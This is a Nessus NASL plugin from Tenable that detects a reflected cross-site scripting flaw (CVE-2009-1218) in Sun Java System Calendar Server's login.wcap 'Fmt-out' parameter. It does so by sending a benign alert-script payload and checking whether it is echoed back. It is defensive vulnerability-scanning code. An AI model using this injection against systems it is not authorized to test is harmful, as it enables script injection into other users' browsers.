#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38913);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-1218");
  script_bugtraq_id(34152);
  script_xref(name:"OSVDB", value:"53179");
  script_xref(name:"Secunia", value:"34528");

  script_name(english:"Sun Java System Calendar Server login.wcap Fmt-out Parameter XSS");
  script_summary(english:"Tries to inject script code into login.wcap");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server uses a script that is affected by a cross-site\n",
      "scripting vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The version of Sun Java System Calendar Server installed on the remote\n",
      "host fails to sanitize input to the 'Fmt-out' parameter of the\n",
      "'login.wcap' script before using it to generate dynamic HTML output.\n",
      "An attacker may be able to leverage this to inject arbitrary HTML and\n",
      "script code into a user's browser to be executed within the security\n",
      "context of the affected site.\n",
      "\n",
      "Note that this install is also likely to be affected by other\n",
      "vulnerabilities, although Nessus has not checked for them."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.coresecurity.com/content/sun-calendar-express"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/502320/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://sunsolve.sun.com/search/document.do?assetkey=1-26-256228-1"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Apply the appropriate patch referenced in the vendor advisory above."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 3080, 3443);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:3080, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Make sure we're looking at Calendar Express / Calendar Server.
res = http_get_cache(item:"/", port:port);
if (isnull(res)) exit(0);

if (
  "Calendar Express" >!< res &&
  'action="login.wcap"' >!< res
) exit(0);


# Try to exploit the issue.
exploit = string("<script>alert('", SCRIPT_NAME, "')</script>");

url = string(
  "/login.wcap?",
  "calid=&",
  "calname=&",
  "date=&",
  "fmt-out=", urlencode(str:exploit), "&",
  "view=&",
  "locale=&",
  "tzid=&",
  "test=", unixtime(), "&",
  "user=NESSUS&",
  "password=", SCRIPT_NAME
);

res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(0);


# There's a problem if we see our exploit in the error message.
if (string(exploit, "&quot is not supported MIME type") >< res[2])
{
  if (report_verbosity > 0)
  {
    set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

    report = string(
      "\n",
      "Nessus was able to exploit the issue using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
